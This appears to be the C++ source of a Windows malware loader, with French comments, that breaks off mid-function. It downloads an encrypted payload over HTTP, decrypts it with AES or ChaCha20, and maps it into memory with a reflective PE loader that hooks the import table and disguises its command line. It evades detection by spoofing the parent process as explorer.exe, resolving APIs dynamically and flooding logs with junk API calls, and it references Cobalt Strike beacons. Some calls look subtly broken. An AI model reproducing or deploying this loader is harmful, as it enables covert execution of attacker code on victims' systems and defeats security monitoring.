#define _CRT_RAND_S
#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <psapi.h>
#include <winternl.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <limits>
#include <stdlib.h>
#include <random>
#include <chrono>
#include <thread>
#include <cctype>

// Remplacer l'include manquant par les définitions nécessaires
#define TH32CS_SNAPPROCESS 0x00000002

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )

#pragma comment (lib, "crypt32.lib")
#pragma comment(lib, "winhttp")

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "ntdll")

// Définitions pour PPID spoofing
typedef struct _PROCESS_INFORMATION_EX {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
} PROCESS_INFORMATION_EX;

typedef struct _STARTUPINFOEXA {
    STARTUPINFOA StartupInfo;
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
} STARTUPINFOEXA, *LPSTARTUPINFOEXA;

typedef struct _PROCESSENTRY32A {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ProcessID;
    ULONG_PTR th32DefaultHeapID;
    DWORD th32ModuleID;
    DWORD cntThreads;
    DWORD th32ParentProcessID;
    LONG pcPriClassBase;
    DWORD dwFlags;
    CHAR szExeFile[MAX_PATH];
} PROCESSENTRY32A, *PPROCESSENTRY32A;

#define TH32CS_SNAPPROCESS 0x00000002
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000

// Déclarations des fonctions API
typedef HANDLE(WINAPI* CreateToolhelp32SnapshotType)(DWORD, DWORD);
typedef BOOL(WINAPI* Process32FirstType)(HANDLE, PPROCESSENTRY32A);
typedef BOOL(WINAPI* Process32NextType)(HANDLE, PPROCESSENTRY32A);
typedef BOOL(WINAPI* InitializeProcThreadAttributeListType)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL(WINAPI* UpdateProcThreadAttributeType)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
typedef VOID(WINAPI* DeleteProcThreadAttributeListType)(LPPROC_THREAD_ATTRIBUTE_LIST);
typedef BOOL(WINAPI* CreateProcessAType)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

EXTERN_C NTSTATUS NtOpenSection(
    OUT PHANDLE             SectionHandle,
    IN ACCESS_MASK          DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes
);

using MyNtMapViewOfSection = NTSTATUS(NTAPI*)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );




typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY;



struct DATA {

    LPVOID data;
    size_t len;

};

// ChaCha20 implementation
class ChaCha20 {
private:
    uint32_t state[16];
    
    uint32_t rotl(uint32_t a, int b) {
        return (a << b) | (a >> (32 - b));
    }
    
    void quarter_round(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
        a += b; d ^= a; d = rotl(d, 16);
        c += d; b ^= c; b = rotl(b, 12);
        a += b; d ^= a; d = rotl(d, 8);
        c += d; b ^= c; b = rotl(b, 7);
    }
    
    void chacha20_block(uint32_t* output) {
        uint32_t working_state[16];
        for (int i = 0; i < 16; i++) {
            working_state[i] = state[i];
        }
        
        for (int i = 0; i < 10; i++) {
            quarter_round(working_state[0], working_state[4], working_state[8], working_state[12]);
            quarter_round(working_state[1], working_state[5], working_state[9], working_state[13]);
            quarter_round(working_state[2], working_state[6], working_state[10], working_state[14]);
            quarter_round(working_state[3], working_state[7], working_state[11], working_state[15]);
            
            quarter_round(working_state[0], working_state[5], working_state[10], working_state[15]);
            quarter_round(working_state[1], working_state[6], working_state[11], working_state[12]);
            quarter_round(working_state[2], working_state[7], working_state[8], working_state[13]);
            quarter_round(working_state[3], working_state[4], working_state[9], working_state[14]);
        }
        
        for (int i = 0; i < 16; i++) {
            output[i] = working_state[i] + state[i];
        }
        
        state[12]++; // Increment counter
    }
    
public:
    void init(const uint8_t* key, const uint8_t* nonce) {
        // ChaCha20 constants
        state[0] = 0x61707865;
        state[1] = 0x3320646e;
        state[2] = 0x79622d32;
        state[3] = 0x6b206574;
        
        // Key (32 bytes)
        for (int i = 0; i < 8; i++) {
            state[4 + i] = ((uint32_t*)key)[i];
        }
        
        // Counter (starts at 0)
        state[12] = 0;
        
        // Nonce (12 bytes)
        for (int i = 0; i < 3; i++) {
            state[13 + i] = ((uint32_t*)nonce)[i];
        }
    }
    
    void encrypt_decrypt(uint8_t* data, size_t length) {
        uint8_t keystream[64];
        size_t pos = 0;
        
        while (pos < length) {
            chacha20_block((uint32_t*)keystream);
            
            size_t remaining = length - pos;
            size_t to_process = (remaining < 64) ? remaining : 64;
            
            for (size_t i = 0; i < to_process; i++) {
                data[pos + i] ^= keystream[i];
            }
            
            pos += to_process;
        }
    }
};

// API Hammering functions
void APIHammer() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1, 10);
    
    // Appels API légitimes pour saturer les logs
    for (int i = 0; i < dis(gen) * 100; i++) {
        GetTickCount();
        GetCurrentProcessId();
        GetCurrentThreadId();
        GetSystemTime(NULL);
        GetLocalTime(NULL);
        GetVersionExA(NULL);
        GetComputerNameA(NULL, NULL);
        GetUserNameA(NULL, NULL);
        GetTempPathA(0, NULL);
        GetWindowsDirectoryA(NULL, 0);
        GetSystemDirectoryA(NULL, 0);
        GetModuleHandleA("kernel32.dll");
        GetModuleHandleA("ntdll.dll");
        GetModuleHandleA("user32.dll");
        FindFirstFileA("C:\\Windows\\*", NULL);
        CreateFileA("NUL", 0, 0, NULL, OPEN_EXISTING, 0, NULL);
        RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE", 0, KEY_READ, NULL);
        
        // Petite pause aléatoire
        if (i % 50 == 0) {
            Sleep(dis(gen));
        }
    }
}

// PPID Spoofing functions
BOOL SetPrivilege(HANDLE hToken, LPCSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueA(NULL, lpszPrivilege, &luid)) {
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        return FALSE;
    }

    return TRUE;
}

DWORD GetParentProcessId() {
    HANDLE hSnapshot;
    PROCESSENTRY32A pe32;
    DWORD ppid = 0, pid = GetCurrentProcessId();

    // Charger dynamiquement les fonctions
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return ppid;
    
    CreateToolhelp32SnapshotType pCreateToolhelp32Snapshot = 
        (CreateToolhelp32SnapshotType)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
    Process32FirstType pProcess32First = 
        (Process32FirstType)GetProcAddress(hKernel32, "Process32First");
    Process32NextType pProcess32Next = 
        (Process32NextType)GetProcAddress(hKernel32, "Process32Next");
        
    if (!pCreateToolhelp32Snapshot || !pProcess32First || !pProcess32Next) {
        FreeLibrary(hKernel32);
        return ppid;
    }

    hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        FreeLibrary(hKernel32);
        return ppid;
    }

    ZeroMemory(&pe32, sizeof(pe32));
    pe32.dwSize = sizeof(pe32);

    if (!pProcess32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        FreeLibrary(hKernel32);
        return ppid;
    }

    do {
        if (pe32.th32ProcessID == pid) {
            ppid = pe32.th32ParentProcessID;
            break;
        }
    } while (pProcess32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    FreeLibrary(hKernel32);
    return ppid;
}

BOOL SpoofPPID(DWORD dwParentProcessId, LPSTARTUPINFOEXA lpStartupInfo) {
    HANDLE hParentProcess;
    SIZE_T dwAttributeListSize = 0;
    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
    BOOL bSuccess = FALSE;

    // Charger dynamiquement les fonctions
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;
    
    InitializeProcThreadAttributeListType pInitializeProcThreadAttributeList = 
        (InitializeProcThreadAttributeListType)GetProcAddress(hKernel32, "InitializeProcThreadAttributeList");
    UpdateProcThreadAttributeType pUpdateProcThreadAttribute = 
        (UpdateProcThreadAttributeType)GetProcAddress(hKernel32, "UpdateProcThreadAttribute");
    DeleteProcThreadAttributeListType pDeleteProcThreadAttributeList = 
        (DeleteProcThreadAttributeListType)GetProcAddress(hKernel32, "DeleteProcThreadAttributeList");
        
    if (!pInitializeProcThreadAttributeList || !pUpdateProcThreadAttribute || !pDeleteProcThreadAttributeList) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwParentProcessId);
    if (!hParentProcess) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    pInitializeProcThreadAttributeList(NULL, 1, 0, &dwAttributeListSize);
    pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, dwAttributeListSize);
    
    if (!pAttributeList) {
        CloseHandle(hParentProcess);
        FreeLibrary(hKernel32);
        return FALSE;
    }

    if (!pInitializeProcThreadAttributeList(pAttributeList, 1, 0, &dwAttributeListSize)) {
        goto cleanup;
    }

    if (!pUpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
                                  &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        goto cleanup;
    }

    lpStartupInfo->lpAttributeList = pAttributeList;
    bSuccess = TRUE;

cleanup:
    if (pAttributeList) {
        pDeleteProcThreadAttributeList(pAttributeList);
        HeapFree(GetProcessHeap(), 0, pAttributeList);
    }
    CloseHandle(hParentProcess);
    FreeLibrary(hKernel32);
    return bSuccess;
}


void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
}

void DecryptChaCha20(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    // Démarrer l'API hammering en arrière-plan
    std::thread hammer_thread(APIHammer);
    hammer_thread.detach();
    
    uint8_t nonce[12] = {0}; // Nonce par défaut
    
    // Si la clé fait plus de 32 bytes, on la tronque, sinon on la pad
    uint8_t chacha_key[32] = {0};
    if (keyLen >= 32) {
        memcpy(chacha_key, key, 32);
    } else {
        memcpy(chacha_key, key, keyLen);
    }
    
    // Générer un nonce à partir de la clé pour plus de variabilité
    for (int i = 0; i < 12 && i < keyLen; i++) {
        nonce[i] = key[i] ^ key[(i + keyLen/2) % keyLen];
    }
    
    ChaCha20 cipher;
    cipher.init(chacha_key, nonce);
    cipher.encrypt_decrypt((uint8_t*)shellcode, shellcodeLen);
    
    // Plus d'API hammering pendant le déchiffrement
    APIHammer();
}

// Fonction pour télécharger depuis une URL complète
DATA GetDataFromURL(const char* url) {
    DATA data = {0};
    
    // Convertir l'URL en wchar_t
    int url_len = strlen(url);
    wchar_t* wurl = new wchar_t[url_len + 1];
    mbstowcs(wurl, url, url_len + 1);
    
    // Parser l'URL pour extraire host, port, et path
    wchar_t* protocol = NULL;
    wchar_t* host = NULL;
    wchar_t* path = NULL;
    DWORD port = 80;
    
    // Chercher le protocole
    wchar_t* protocol_end = wcsstr(wurl, L"://");
    if (protocol_end) {
        protocol_end += 3; // Skip "://"
        
        // Chercher le port ou le path
        wchar_t* port_start = wcschr(protocol_end, L':');
        wchar_t* path_start = wcschr(protocol_end, L'/');
        
        if (port_start && (!path_start || port_start < path_start)) {
            // Il y a un port spécifié
            *port_start = L'\0';
            host = protocol_end;
            port_start++;
            
            if (path_start) {
                *path_start = L'\0';
                port = wcstoul(port_start, NULL, 10);
                *path_start = L'/';
                path = path_start;
            } else {
                port = wcstoul(port_start, NULL, 10);
                path = L"/";
            }
        } else if (path_start) {
            // Pas de port, juste le path
            *path_start = L'\0';
            host = protocol_end;
            *path_start = L'/';
            path = path_start;
            
            // Détecter HTTPS
            if (wcsstr(wurl, L"https://")) {
                port = 443;
            }
        } else {
            // Juste le hostname
            host = protocol_end;
            path = L"/";
        }
    } else {
        // URL sans protocole, traiter comme host/path
        wchar_t* path_start = wcschr(wurl, L'/');
        if (path_start) {
            *path_start = L'\0';
            host = wurl;
            *path_start = L'/';
            path = path_start;
        } else {
            host = wurl;
            path = L"/";
        }
    }
    
    if (host && path) {
        data = GetData(host, port, path);
    }
    
    delete[] wurl;
    return data;
}


DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {

    DATA data;
    std::vector<unsigned char> buffer;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);


    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, whost,
            port, 0);
    else
        printf("Failed in WinHttpConnect (%u)\n", GetLastError());

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", wresource,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL);
    else
        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {

                    buffer.insert(buffer.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);

                }
                delete[] pszOutBuffer;
            }

        } while (dwSize > 0);

        if (buffer.empty() == TRUE)
        {
            printf("Failed in retrieving the Shellcode");
        }

        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        size_t size = buffer.size();

        char* bufdata = (char*)malloc(size);
        for (int i = 0; i < buffer.size(); i++) {
            bufdata[i] = buffer[i];
        }
        data.data = bufdata;
        data.len = size;
        return data;

}


//cmdline args vars
BOOL hijackCmdline = FALSE;
char* sz_masqCmd_Ansi = NULL;
char* sz_masqCmd_ArgvAnsi[100];
wchar_t* sz_masqCmd_Widh = NULL;
wchar_t* sz_masqCmd_ArgvWidh[100];
wchar_t** poi_masqArgvW = NULL;
char** poi_masqArgvA = NULL;
int int_masqCmd_Argc = 0;
struct MemAddrs* pMemAddrs = NULL;
DWORD dwTimeout = 0;

//PE vars
BYTE* pImageBase = NULL;
IMAGE_NT_HEADERS* ntHeader = NULL;


//-------------All of these functions are custom-defined versions of functions we hook in the PE's IAT-------------

LPWSTR hookGetCommandLineW()
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: getcommandlinew");
    return sz_masqCmd_Widh;
}

LPSTR hookGetCommandLineA()
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: getcommandlinea");
    return sz_masqCmd_Ansi;
}

char*** __cdecl hook__p___argv(void)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: __p___argv");
    return &poi_masqArgvA;
}

wchar_t*** __cdecl hook__p___wargv(void)
{

    //BeaconPrintf(CALLBACK_OUTPUT, "called: __p___wargv");
    return &poi_masqArgvW;
}

int* __cdecl hook__p___argc(void)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: __p___argc");
    return &int_masqCmd_Argc;
}

int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called __wgetmainargs");
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvW;

    return 0;
}

int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called __getmainargs");
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvA;

    return 0;
}

_onexit_t __cdecl hook_onexit(_onexit_t function)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called onexit!\n");
    return 0;
}

int __cdecl hookatexit(void(__cdecl* func)(void))
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called atexit!\n");
    return 0;
}

int __cdecl hookexit(int status)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "Exit called!\n");
    //_cexit() causes cmd.exe to break for reasons unknown...
    ExitThread(0);
    return 0;
}

void __stdcall hookExitProcess(UINT statuscode)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "ExitProcess called!\n");
    ExitThread(0);
}
void masqueradeCmdline()
{
    //Convert cmdline to widestring
    int required_size = MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, NULL, 0);
    sz_masqCmd_Widh = (wchar_t*)calloc(required_size + 1, sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);

    //Create widestring array of pointers
    poi_masqArgvW = CommandLineToArgvW(sz_masqCmd_Widh, &int_masqCmd_Argc);

    //Manual function equivalent for CommandLineToArgvA
    int retval;
    int memsize = int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i)
    {
        retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, NULL, 0, NULL, NULL);
        memsize += retval;
    }

    poi_masqArgvA = (LPSTR*)LocalAlloc(LMEM_FIXED, memsize);

    int bufLen = memsize - int_masqCmd_Argc * sizeof(LPSTR);
    LPSTR buffer = ((LPSTR)poi_masqArgvA) + int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i)
    {
        retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, buffer, bufLen, NULL, NULL);
        poi_masqArgvA[i] = buffer;
        buffer += retval;
        bufLen -= retval;
    }

    hijackCmdline = TRUE;
}


//This array is created manually since CommandLineToArgvA doesn't exist, so manually freeing each item in array
void freeargvA(char** array, int Argc)
{
    //Wipe cmdline args from beacon memory
    for (int i = 0; i < Argc; i++)
    {
        memset(array[i], 0, strlen(array[i]));
    }
    LocalFree(array);
}

//This array is returned from CommandLineToArgvW so using LocalFree as per MSDN
void freeargvW(wchar_t** array, int Argc)
{
    //Wipe cmdline args from beacon memory
    for (int i = 0; i < Argc; i++)
    {
        memset(array[i], 0, wcslen(array[i]) * 2);
    }
    LocalFree(array);
}


char* GetNTHeaders(char* pe_buffer)
{
    if (pe_buffer == NULL) return NULL;

    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    const LONG kMaxOffset = 1024;
    LONG pe_offset = idh->e_lfanew;
    if (pe_offset > kMaxOffset) return NULL;
    IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((char*)pe_buffer + pe_offset);
    if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
    return (char*)inh;
}

IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)
{
    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;

    char* nt_headers = GetNTHeaders((char*)pe_buffer);
    if (nt_headers == NULL) return NULL;

    IMAGE_DATA_DIRECTORY* peDir = NULL;

    IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
    peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);

    if (peDir->VirtualAddress == NULL) {
        return NULL;
    }
    return peDir;
}

bool RepairIAT(PVOID modulePtr)
{
    IMAGE_DATA_DIRECTORY* importsDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (importsDir == NULL) return false;

    size_t maxSize = importsDir->Size;
    size_t impAddr = importsDir->VirtualAddress;

    IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
    size_t parsedSize = 0;

    for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);

        if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
        LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);

        size_t call_via = lib_desc->FirstThunk;
        size_t thunk_addr = lib_desc->OriginalFirstThunk;
        if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;

        size_t offsetField = 0;
        size_t offsetThunk = 0;
        while (true)
        {
            IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetField + call_via);
            IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetThunk + thunk_addr);

            if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64)
            {
                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
                fieldThunk->u1.Function = addr;
            }

            if (fieldThunk->u1.Function == NULL) break;

            if (fieldThunk->u1.Function == orginThunk->u1.Function) {

                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(modulePtr)+orginThunk->u1.AddressOfData);
                LPSTR func_name = (LPSTR)by_name->Name;

                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name);
                

                if (hijackCmdline && _stricmp(func_name, "GetCommandLineA") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineA;
                }
                else if (hijackCmdline && _stricmp(func_name, "GetCommandLineW") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineW;
                }
                else if (hijackCmdline && _stricmp(func_name, "__wgetmainargs") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__wgetmainargs;
                }
                else if (hijackCmdline && _stricmp(func_name, "__getmainargs") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__getmainargs;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___argv") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___argv;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___wargv") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___wargv;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___argc") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___argc;
                }
                else if (hijackCmdline && (_stricmp(func_name, "exit") == 0 || _stricmp(func_name, "_Exit") == 0 || _stricmp(func_name, "_exit") == 0 || _stricmp(func_name, "quick_exit") == 0))
                {
                    fieldThunk->u1.Function = (size_t)hookexit;
                }
                else if (hijackCmdline && _stricmp(func_name, "ExitProcess") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookExitProcess;
                }
                else
                    fieldThunk->u1.Function = addr;

            }
            offsetField += sizeof(IMAGE_THUNK_DATA);
            offsetThunk += sizeof(IMAGE_THUNK_DATA);
        }
    }
    return true;
}

void PELoader(char* data, DWORD datasize)
{

    masqueradeCmdline();

    unsigned int chksum = 0;
    for (long long i = 0; i < datasize; i++) { chksum = data[i] * i + chksum / 3; };

    BYTE* pImageBase = NULL;
    LPVOID preferAddr = 0;
    DWORD OldProtect = 0;
    
    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)GetNTHeaders(data);
    if (!ntHeader) {
        exit(0);
    }
    
    IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;


    HMODULE dll = LoadLibraryA("ntdll.dll");
    ((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);

    pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImageBase) {
        if (!relocDir) {
            exit(0);
        }
        else {
            pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!pImageBase)
            {
                exit(0);
            }
        }
    }

    // FILL the memory block with PEdata
    ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
    memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);

    IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
    {
        memcpy(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress), LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
    }

    // Fix the PE Import addr table
    RepairIAT(pImageBase);

    // AddressOfEntryPoint
    size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
    
    EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);
    
}


LPVOID getNtdll() {

    LPVOID pntdll = NULL;

    // API Hammering avant la création du processus
    std::thread hammer_thread(APIHammer);
    hammer_thread.detach();

    //Create our suspended process with PPID spoofing
    STARTUPINFOEXA sie;
    PROCESS_INFORMATION pi;
    ZeroMemory(&sie, sizeof(sie));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    
    sie.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Essayer de trouver explorer.exe comme processus parent légitime
    HANDLE hSnapshot;
    PROCESSENTRY32A pe32;
    DWORD explorerPID = 0;
    
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (hKernel32) {
        CreateToolhelp32SnapshotType pCreateToolhelp32Snapshot = 
            (CreateToolhelp32SnapshotType)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
        Process32FirstType pProcess32First = 
            (Process32FirstType)GetProcAddress(hKernel32, "Process32First");
        Process32NextType pProcess32Next = 
            (Process32NextType)GetProcAddress(hKernel32, "Process32Next");
            
        if (pCreateToolhelp32Snapshot && pProcess32First && pProcess32Next) {
